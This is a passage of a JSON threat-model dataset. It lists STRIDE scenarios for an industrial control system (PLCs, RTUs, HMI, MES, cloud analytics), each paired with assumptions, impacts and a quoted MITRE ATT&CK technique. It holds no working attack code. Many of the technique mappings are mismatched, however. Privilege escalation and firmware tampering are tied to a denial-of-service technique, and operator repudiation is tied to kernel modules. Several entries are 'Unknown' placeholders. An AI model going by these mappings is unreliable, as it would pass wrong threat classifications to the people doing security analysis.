            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a software vulnerability in PLC firmware to gain administrative access.",
            "Assumptions": [
                {
                    "Assumption": "The PLC firmware contains unpatched vulnerabilities.",
                    "Role": "PLC Manufacturer",
                    "Condition": "Unpatched software"
                },
                {
                    "Assumption": "The attacker can access the PLC network.",
                    "Role": "Attacker",
                    "Condition": "Network access"
                },
                {
                    "Assumption": "No additional access controls are implemented on the PLC.",
                    "Role": "System Design",
                    "Condition": "Weak access controls"
                }
            ],
            "Potential Impact": "Unauthorized administrative control over PLCs, leading to potential sabotage or data manipulation.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "PLC",
                "vulnerability",
                "administrative access"
            ],
            "mitre_technique": {
                "name": "Exploitation for Privilege Escalation",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020) Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) or [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570).",
                "id": "attack-pattern--b21c3b2d-02e6-45b1-980b-e69051040839",
                "technique_id": "T1068"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An insider uses legitimate credentials to access and escalate privileges within the MES.",
            "Assumptions": [
                {
                    "Assumption": "The insider has access to legitimate credentials.",
                    "Role": "Insider",
                    "Condition": "Authorized access"
                },
                {
                    "Assumption": "The MES does not have proper segregation of duties.",
                    "Role": "System Design",
                    "Condition": "No role segregation"
                },
                {
                    "Assumption": "There are no monitoring mechanisms to detect unusual privilege escalation.",
                    "Role": "Security Monitoring",
                    "Condition": "No monitoring"
                }
            ],
            "Potential Impact": "Insider gains unauthorized access to administrative functions, potentially leading to data breaches or process disruption.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "insider threat",
                "MES",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "Group Policy Discovery",
                "description": "Adversaries may gather information on Group Policy settings to identify paths for privilege escalation, security measures applied within a domain, and to discover patterns in domain objects that can be manipulated or used to blend in the environment. Group Policy allows for centralized management of user and computer settings in Active Directory (AD). Group policy objects (GPOs) are containers for group policy settings made up of files stored within a predictable network path `\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\`.(Citation: TechNet Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016)\n\nAdversaries may use commands such as <code>gpresult</code> or various publicly available PowerShell functions, such as <code>Get-DomainGPO</code> and <code>Get-DomainGPOLocalGroup</code>, to gather information on Group Policy settings.(Citation: Microsoft gpresult)(Citation: Github PowerShell Empire) Adversaries may use this information to shape follow-on behaviors, including determining potential attack paths within the target network as well as opportunities to manipulate Group Policy settings (i.e. [Domain or Tenant Policy Modification](https://attack.mitre.org/techniques/T1484)) for their benefit.",
                "id": "attack-pattern--1b20efbf-8063-4fc3-a07d-b575318a301b",
                "technique_id": "T1615"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A remote attacker exploits a zero-day vulnerability in the cloud service interface to gain elevated privileges.",
            "Assumptions": [
                {
                    "Assumption": "The cloud service has a zero-day vulnerability.",
                    "Role": "Cloud Service Provider",
                    "Condition": "Unknown vulnerability"
                },
                {
                    "Assumption": "The attacker discovers and exploits this vulnerability.",
                    "Role": "Attacker",
                    "Condition": "Exploitation capabilities"
                },
                {
                    "Assumption": "There are no additional security layers to mitigate exploitation.",
                    "Role": "System Design",
                    "Condition": "Lack of mitigation"
                }
            ],
            "Potential Impact": "Remote attacker gains administrative access, potentially compromising all data and control within the cloud service.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "zero-day",
                "cloud service",
                "administrative access"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        }
    ]
},
{
    "case_number": "4",
    "batch_number": "4",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "Spoofing an operator to gain unauthorized access to the Control Center's HMI system.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can obtain valid login credentials or exploit weak authentication mechanisms.",
                    "Role": "Attacker",
                    "Condition": "Credentials can be leaked or weak security measures in place."
                },
                {
                    "Assumption": "The attacker has network access to the Control Center.",
                    "Role": "Attacker",
                    "Condition": "The network is accessible either internally or remotely."
                },
                {
                    "Assumption": "No multi-factor authentication is required for remote access.",
                    "Role": "Control Center",
                    "Condition": "Authentication system does not enforce multi-factor authentication."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive operational data, potential tampering with manufacturing processes, and system access disruptions.",
            "MITRE ATT&CK Keywords": [
                "Identity Theft",
                "Remote Services",
                "Valid Accounts"
            ],
            "mitre_technique": {
                "name": "External Remote Services",
                "description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)\n\nAccess to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)",
                "id": "attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d",
                "technique_id": "T1133"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Spoofing a field device to inject malicious data into the system.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can emulate the communication protocol used by field devices.",
                    "Role": "Attacker",
                    "Condition": "Knowledge of communication protocols and network access."
                },
                {
                    "Assumption": "Field devices do not use strong mutual authentication with RTUs.",
                    "Role": "Field Device",
                    "Condition": "Lack of mutual authentication mechanisms."
                },
                {
                    "Assumption": "Attackers have access to the network segment where field devices operate.",
                    "Role": "Attacker",
                    "Condition": "Insufficient network segmentation."
                }
            ],
            "Potential Impact": "Inaccurate data leading to operational disruptions, risk of physical damage to machinery, and corrupted data in the MES.",
            "MITRE ATT&CK Keywords": [
                "Input Injection",
                "Masquerading",
                "Network Sniffing"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Spoofing a cloud service to steal data in transit.",
            "Assumptions": [
                {
                    "Assumption": "Data transmission does not use secure protocols.",
                    "Role": "Communication Protocol",
                    "Condition": "Lack of or improper use of encryption."
                },
                {
                    "Assumption": "The attacker can intercept or modify data packets between the gateway and cloud services.",
                    "Role": "Network Attacker",
                    "Condition": "Access to data transmission channels."
                },
                {
                    "Assumption": "No certificate pinning is used to ensure cloud service authenticity.",
                    "Role": "Cloud Service",
                    "Condition": "Absence of certificate pinning mechanisms."
                }
            ],
            "Potential Impact": "Interception and unauthorized access to sensitive data, potential data tampering, and breach of data confidentiality.",
            "MITRE ATT&CK Keywords": [
                "Network Interception",
                "Man-in-the-Middle",
                "Impersonation"
            ],
            "mitre_technique": {
                "name": "Protocol Impersonation",
                "description": "Adversaries may impersonate legitimate protocols or web service traffic to disguise command and control activity and thwart analysis efforts. By impersonating legitimate protocols or web services, adversaries can make their command and control traffic blend in with legitimate network traffic.  \n\nAdversaries may impersonate a fake SSL/TLS handshake to make it look like subsequent traffic is SSL/TLS encrypted, potentially interfering with some security tooling, or to make the traffic look like it is related with a trusted entity. ",
                "id": "attack-pattern--c325b232-d5bc-4dde-a3ec-71f3db9e8adc",
                "technique_id": "T1001.003"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Tampering with the control commands sent from the Control Center to RTUs.",
            "Assumptions": [
                {
                    "Assumption": "RTU communication is not adequately protected with encryption.",
                    "Role": "RTU",
                    "Condition": "Lack of or weak encryption practices."
                },
                {
                    "Assumption": "The attacker has access to the network where commands are transmitted.",
                    "Role": "Attacker",
                    "Condition": "Network access, either internal or external."
                },
                {
                    "Assumption": "Basic or no integrity checks are in place for control commands.",
                    "Role": "Control Center",
                    "Condition": "Absence of cryptographic integrity verification."
                }
            ],
            "Potential Impact": "Unauthorized changes to manufacturing processes, potential production inefficiencies, and risk of physical harm or damage.",
            "MITRE ATT&CK Keywords": [
                "Command Injection",
                "Data Manipulation",
                "Remote Command Execution"
            ],
            "mitre_technique": {
                "name": "Transmitted Data Manipulation",
                "description": "Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nManipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--cc1e737c-236c-4e3b-83ba-32039a626ef8",
                "technique_id": "T1493"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Modifying firmware in field devices to alter their behavior.",
            "Assumptions": [
                {
                    "Assumption": "Field devices can be reprogrammed remotely without robust authentication.",
                    "Role": "Field Device",
                    "Condition": "Weak or absent firmware integrity checks."
                },
                {
                    "Assumption": "The attacker has remote access to the field device management interface.",
                    "Role": "Attacker",
                    "Condition": "Compromised or infiltrated access channels."
                },
                {
                    "Assumption": "Firmware updates are not digitally signed or validated.",
                    "Role": "Field Device",
                    "Condition": "Lack of digital signatures for firmware."
                }
            ],
            "Potential Impact": "Compromised device functionality, data corruption, and potential control system failures.",
            "MITRE ATT&CK Keywords": [
                "Firmware Corruption",
                "Device Reprogramming",
                "Remote Access"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Altering data in the MES database to disrupt production workflows.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has write access to the MES database.",
                    "Role": "Database Administrator",
                    "Condition": "Weak access control mechanisms."
                },
                {
                    "Assumption": "Database encryption is not applied or is improperly managed.",
                    "Role": "MES",
                    "Condition": "Lack of adequate encryption for data at rest."
                },
                {
                    "Assumption": "There is insufficient logging or monitoring of database activities.",
                    "Role": "MES",
                    "Condition": "Lack of adequate audit trails."
                }
            ],
            "Potential Impact": "Disruption to production schedules, loss of production data integrity, and potential financial losses.",
            "MITRE ATT&CK Keywords": [
                "Database Corruption",
                "SQL Injection",
                "Privileges Escalation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Operators deny sending or modifying control commands in the SCADA system.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient logging of user activities and actions in the control system.",
                    "Role": "Control Center",
                    "Condition": "Lack of or inadequate logging practices."
                },
                {
                    "Assumption": "No digital signatures or cryptographic proofs to authenticate user actions.",
                    "Role": "Control System",
                    "Condition": "Absence of non-repudiation mechanisms."
                },
                {
                    "Assumption": "Access control mechanisms do not enforce individual accountability.",
                    "Role": "Control Center",
                    "Condition": "Poor implementation of user-specific access controls."
                }
            ],
            "Potential Impact": "Difficulty in establishing accountability, increased risk of insider threats, and obstruction of forensic investigations.",
            "MITRE ATT&CK Keywords": [
                "Log Tampering",
                "Non-repudiation Bypass",
                "Activity Concealment"
            ],
            "mitre_technique": {
                "name": "Kernel Modules and Extensions",
                "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
                "id": "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5",
                "technique_id": "T1215"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Field technicians deny having reconfigured field devices.",
            "Assumptions": [
                {
                    "Assumption": "Field device configuration changes are not logged or auditable.",
                    "Role": "Field Device",
                    "Condition": "Lack of logging mechanisms on configuration changes."
                },
                {
                    "Assumption": "No system of record to verify the source of configuration commands.",
                    "Role": "Field Device Management",
                    "Condition": "Absence of command source verification."
                },
                {
                    "Assumption": "Configuration changes do not include user identifiers or timestamps.",
                    "Role": "Device Configuration",
                    "Condition": "Lack of metadata in configuration changes."
                }
            ],
            "Potential Impact": "Challenges in verifying and auditing changes, increased safety and operational risks, and potential for unauthorized configurations.",
            "MITRE ATT&CK Keywords": [
                "Configuration Forging",
                "Log Deletion",
                "Insider Threat"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Users deny accessing and extracting sensitive data from cloud services.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient logging and monitoring of data access activities in the cloud.",
                    "Role": "Cloud Services",
                    "Condition": "Inadequate log management and monitoring."
                },
                {
                    "Assumption": "Data access does not generate tamper-proof audit records.",
                    "Role": "Cloud Services",
                    "Condition": "Absence of tamper-evident logs."
                },
                {
                    "Assumption": "Authentication logs are not linked to data access events.",
                    "Role": "Cloud Services",
                    "Condition": "Separate logging of authentication and data access."
                }
            ],
            "Potential Impact": "Difficulty in enforcing data confidentiality policies, escalated risks of data breaches, and problematic security incident investigations.",
            "MITRE ATT&CK Keywords": [
                "Cloud Abuse",
                "Data Access Concealment",
                "Audit Log Evasion"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Interception of unencrypted data transmitted between field devices and RTUs.",
            "Assumptions": [
                {
                    "Assumption": "Data transmission between field devices and RTUs is not encrypted.",
                    "Role": "Field Devices",
                    "Condition": "Lack of encryption practice for data in transit."
                },
                {
                    "Assumption": "The attacker can access the network segment for eavesdropping.",
                    "Role": "Attacker",
                    "Condition": "Network access to data transmission paths."
                },
                {
                    "Assumption": "No network segmentation or filtering to limit traffic monitoring.",
                    "Role": "Network Infrastructure",
                    "Condition": "Poor network design and segmentation."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive operational data and potential use of intercepted information for further attacks.",
            "MITRE ATT&CK Keywords": [
                "Eavesdropping",
                "Data Packet Sniffing",
                "Network Traffic Monitoring"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unauthorized access to sensitive data stored in cloud storage due to weak access controls.",
            "Assumptions": [
                {
                    "Assumption": "Cloud storage access controls are not strictly enforced.",
                    "Role": "Cloud Storage",
                    "Condition": "Inadequate access control policies."
                },
                {
                    "Assumption": "Sensitive data is not encrypted at rest in cloud storage.",
                    "Role": "Cloud Services",
                    "Condition": "Lack of data encryption at rest."
                },
                {
                    "Assumption": "User roles and permissions are not properly managed.",
                    "Role": "Cloud Administrators",
                    "Condition": "Improper role and permission management."
                }
            ],
            "Potential Impact": "Exposure of confidential operational and production data, potential data breaches, and significant financial and reputational damage.",
            "MITRE ATT&CK Keywords": [
                "Unauthorized Cloud Access",
                "Data Breach",
                "Permission Mismanagement"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Disclosure of sensitive data from compromised cloud analytics services.",
            "Assumptions": [
                {
                    "Assumption": "Cloud analytics services do not employ strong security measures.",
                    "Role": "Cloud Services",
                    "Condition": "Weak security configurations and practices."
                },
                {
                    "Assumption": "Sensitive data used in analytics is not anonymized or properly protected.",
                    "Role": "Data Analytics",
                    "Condition": "Lack of data protection measures."
                },
                {
                    "Assumption": "The attacker can exploit vulnerabilities in cloud analytics applications.",
                    "Role": "Attacker",
                    "Condition": "Existence of exploitable vulnerabilities."
                }
            ],
            "Potential Impact": "Unauthorized access to and possible leak of sensitive analyzed data, compromised decision-making processes, and potential misuse of data insights.",
            "MITRE ATT&CK Keywords": [
                "Cloud Exploitation",
                "Data Leak",
                "Vulnerability Exploitation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Distributed DoS attack against the Control Center to disrupt operations.",
            "Assumptions": [
                {
                    "Assumption": "The Control Center is accessible over the internet.",
                    "Role": "Control Center",
                    "Condition": "Public network exposure."
                },
                {
                    "Assumption": "Adequate DoS protection mechanisms are not in place.",
                    "Role": "Network Security",
                    "Condition": "Lack of or insufficient DoS defenses."
                },
                {
                    "Assumption": "The attacker can deploy a botnet to initiate the attack.",
                    "Role": "Attacker",
                    "Condition": "Access to significant botnet resources."
                }
            ],
            "Potential Impact": "Operational disruption, unavailability of control systems, and potential safety risks.",
            "MITRE ATT&CK Keywords": [
                "Distributed Denial of Service",
                "Network Flood",
                "Service Disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "DoS attack targeting the gateway to disrupt data transmission between field devices and cloud services.",
            "Assumptions": [
                {
                    "Assumption": "The gateway is not adequately protected against high-volume traffic.",
                    "Role": "Gateway",
                    "Condition": "Weak network security defenses."
                },
                {
                    "Assumption": "The attacker has knowledge of the gateway's IP address.",
                    "Role": "Attacker",
                    "Condition": "Exposed gateway IP information."
                },
                {
                    "Assumption": "There are no redundant systems to handle data transmission.",
                    "Role": "System Design",
                    "Condition": "Lack of redundancy and failover mechanisms."
                }
            ],
            "Potential Impact": "Disruption to data flow, loss of real-time processing capabilities, and operational inefficiencies.",
            "MITRE ATT&CK Keywords": [
                "Service Overload",
                "Network Traffic Saturation",
                "Gateway Disruption"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Overloading SCADA system RTUs with malicious data packets.",
            "Assumptions": [
                {
                    "Assumption": "RTUs are not equipped to handle unexpected high traffic loads.",
                    "Role": "RTUs",
                    "Condition": "No rate-limiting or traffic filtering."
                },
                {
                    "Assumption": "The attacker can send data packets directly to RTUs.",
                    "Role": "Attacker",
                    "Condition": "Direct network access to RTUs."
                },
                {
                    "Assumption": "Insufficient monitoring of network traffic anomalies.",
                    "Role": "Network Monitoring",
                    "Condition": "Lack of effective traffic analysis."
                }
            ],
            "Potential Impact": "Operational disruptions, data collection interruptions, and potential control logic failures.",
            "MITRE ATT&CK Keywords": [
                "Traffic Overload",
                "Network Saturation",
                "Protocol Abuse"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Compromising low-privileged user accounts to gain admin access in the MES.",
            "Assumptions": [
                {
                    "Assumption": "Access control policies in the MES have vulnerabilities.",
                    "Role": "MES System",
                    "Condition": "Exploitable weaknesses in access controls."
                },
                {
                    "Assumption": "The attacker can execute privilege escalation techniques.",
                    "Role": "Attacker",
                    "Condition": "Knowledge of privilege escalation methods."
                },
                {
                    "Assumption": "Monitoring and incident response mechanisms are inadequate.",
                    "Role": "Incident Response",
                    "Condition": "Slow or ineffective monitoring of access anomalies."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive production data, potential tampering with workflows, and increased risk of further system compromise.",
            "MITRE ATT&CK Keywords": [
                "Privilege Escalation Techniques",
                "Identity and Access Management",
                "User Account Exploitation"
            ],
            "mitre_technique": {
                "name": "Conditional Access Policies",
                "description": "Adversaries may disable or modify conditional access policies to enable persistent access to compromised accounts. Conditional access policies are additional verifications used by identity providers and identity and access management systems to determine whether a user should be granted access to a resource.\n\nFor example, in Azure AD, Okta, and JumpCloud, users can be denied access to applications based on their IP address, device enrollment status, and use of multi-factor authentication.(Citation: Microsoft Conditional Access)(Citation: JumpCloud Conditional Access Policies)(Citation: Okta Conditional Access Policies) In some cases, identity providers may also support the use of risk-based metrics to deny sign-ins based on a variety of indicators. In AWS and GCP, IAM policies can contain `condition` attributes that verify arbitrary constraints such as the source IP, the date the request was made, and the nature of the resources or regions being requested.(Citation: AWS IAM Conditions)(Citation: GCP IAM Conditions) These measures help to prevent compromised credentials from resulting in unauthorized access to data or resources, as well as limit user permissions to only those required. \n\nBy modifying conditional access policies, such as adding additional trusted IP ranges, removing [Multi-Factor Authentication](https://attack.mitre.org/techniques/T1556/006) requirements, or allowing additional [Unused/Unsupported Cloud Regions](https://attack.mitre.org/techniques/T1535), adversaries may be able to ensure persistent access to accounts and circumvent defensive measures.",
                "id": "attack-pattern--ceaeb6d8-95ee-4da2-9d42-dc6aa6ca43ae",
                "technique_id": "T1556.009"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploiting vulnerabilities in the HMI to achieve system-level privileges.",
            "Assumptions": [
                {
                    "Assumption": "HMI software has known or zero-day vulnerabilities.",
                    "Role": "HMI",
                    "Condition": "Existence of exploitable software flaws."
                },
                {
                    "Assumption": "The attacker has network access to the HMI system.",
                    "Role": "Attacker",
                    "Condition": "Network exposure enabling direct interaction."
                },
                {
                    "Assumption": "No runtime protections or application hardening have been applied.",
                    "Role": "HMI System",
                    "Condition": "Weak or absent software defenses."
                }
            ],
            "Potential Impact": "Full system compromise, unauthorized control over industrial processes, and potential for executing arbitrary commands.",
            "MITRE ATT&CK Keywords": [
                "Exploitation for Privilege Escalation",
                "Runtime Exploitation",
                "HMI Compromise"
            ],
            "mitre_technique": {
                "name": "Exploitation for Privilege Escalation",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020) Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool 